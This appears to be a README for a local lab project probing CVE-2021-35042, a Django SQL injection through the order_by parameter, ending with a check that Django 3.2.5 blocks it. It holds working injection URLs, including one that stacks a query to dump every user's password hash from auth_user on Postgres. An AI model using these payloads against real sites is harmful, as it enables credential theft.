# CVE-2021-35042

Django SQL injection bug

Question: explore how exploitable is it?

Answer: I'm terrified

## Install

`poetry install`

`poetry run ./manage.py migrate`

`poetry run ./manage.py loaddata dummydata.json`

## Interactive Demo

`poetry run ./manage.py runserver`

#### Ordering by random fields

go to http://localhost:8000/?order_by=%22core_things_tags%22.%22things_id%22
note that the ?order_by param is passing a Raw SQL reference to a
column `"core_things_tags"."things_id"`

### terminate first query and try to run some sql

This feels like about as far as you can
get: http://localhost:8000/?order_by=%22core_things_tags%22.%22things_id%22%20and%201);%20select%201%20as%20name%20;--
which closes the first SQL query translates to the follow SQL:

```sql
SELECT "core_things"."id",
       "core_things"."name",
       COUNT("core_things_tags"."tag_id") AS "num_tags"
FROM "core_things"
         LEFT OUTER JOIN "core_things_tags" ON ("core_things"."id" =
                                                "core_things_tags"."things_id")
GROUP BY "core_things"."id", "core_things"."name",
         ("core_things_tags"."things_id" and 1);
select 1 as name;--) ORDER BY ("core_things_tags"."things_id" and 1); select 1 as name ;--) ASC LIMIT 21; args=()
```

which fails with:

```
Warning at /
You can only execute one statement at a time.
```

this is just because sqlite can only run 1 query at a time

#### revisit running 2nd query with postgres

```bash
export DJANGO_DATABASE_URL=postgres://user:pass@localhost:5432/cve-2021-35042 # make this a valid DATABASE_URL for your own postgres server
```

`poetry run ./manage.py migrate`

`poetry run ./manage.py loaddata dummydata.json`

`poetry run ./manage.py createsuperuser` # follow prompts

visit: http://localhost:8000/?order_by=%22core_things_tags%22.%22things_id%22%20);%20SELECT%201%20as%20id,%20%22password%22as%20name,%201%20as%20num_tags%20from%20%22auth_user%22;--

which runs the following sql:

```sql
SELECT "core_things"."id",
       "core_things"."name",
       COUNT("core_things_tags"."tag_id") AS "num_tags"
FROM "core_things"
         LEFT OUTER JOIN "core_things_tags" ON ("core_things"."id" =
                                                "core_things_tags"."things_id")
GROUP BY "core_things"."id", ("core_things_tags"."things_id");
SELECT 1 as id, "password" as name, 1 as num_tags
from "auth_user";--) ORDER BY ("core_things_tags"."things_id" ); SELECT 1 as id, "password"as name, 1 as num_tags from "auth_user";--) ASC;
```

you can now do basically anything. This query steals the password hash for every
user.

### Upgrade to non-vunerable version

now temporarily upgrade django

`poetry shell`

`pip install Django==3.2.5`

revisit the above URL and note that it no longer works:

```
FieldError at /
Cannot resolve keyword '"core_things_tags"."things_id"' into field. Choices are: id, name, num_tags, tags
```
